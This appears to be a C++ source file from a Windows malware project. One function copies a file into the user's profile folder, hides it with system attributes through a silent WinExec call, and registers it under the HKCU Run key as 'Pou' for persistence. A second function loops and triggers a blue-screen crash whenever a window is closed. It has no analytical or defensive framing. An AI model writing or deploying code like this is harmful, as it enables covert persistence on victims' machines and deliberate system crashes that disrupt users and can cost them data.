#include "Common.h"


void startupInfector(string file, string newName) {


	string userPath = "C:\\Users\\" + username();
	cout << userPath << endl;

	string fullFilePath = "\"" + userPath + "\\" + newName + "\"";

	cout << fullFilePath;

	copyFile(file, userPath, newName);
	



	string attribCommand = "attrib +H +S +I +R " + userPath + "\\" + newName;



	WinExec(attribCommand.c_str(), SW_HIDE);
	



	setRegestryValue("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Pou", "REG_SZ", fullFilePath);

}


void pouVitalsCheck() {
    
	Sleep(2000);

	for (;;) {


		int firstCheck = getNumOfWindows();

		Sleep(10);

		if (firstCheck > getNumOfWindows()) {
			BSOD();
		}
		
		  

	}

}